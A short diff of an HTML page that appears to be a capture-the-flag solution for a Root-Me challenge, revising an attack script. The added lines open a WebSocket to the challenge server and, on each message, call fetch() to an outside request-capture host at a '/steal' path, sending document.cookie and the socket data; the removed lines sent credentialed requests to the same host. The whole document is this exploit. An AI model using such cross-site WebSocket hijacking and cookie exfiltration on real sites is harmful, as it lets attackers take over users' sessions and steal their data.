@@ -5,16 +5,8 @@
 </head>
 <body>
     <script>
-        const socket = new WebSocket('ws://ctf17.root-me.org/ws'); // Remplace par ton URL WebSocket
-        socket.onmessage = (event) => {
-            fetch('https://keskispace.free.beeceptor.com', {
-                credentials: 'include' // Inclut les cookies dans la requête
-            });
-        };
-
-        socket.onerror = (error) => {
-            console.error('Erreur WebSocket:', error);
-        };
+        const ws = new WebSocket("ws://ctf17.root-me.org/ws");
+        ws.onmessage = (e) => { fetch("https://keskispace.free.beeceptor.com/steal?cookie=" + document.cookie + "data=" + e.data ); };
     </script>
 </body>
 </html>
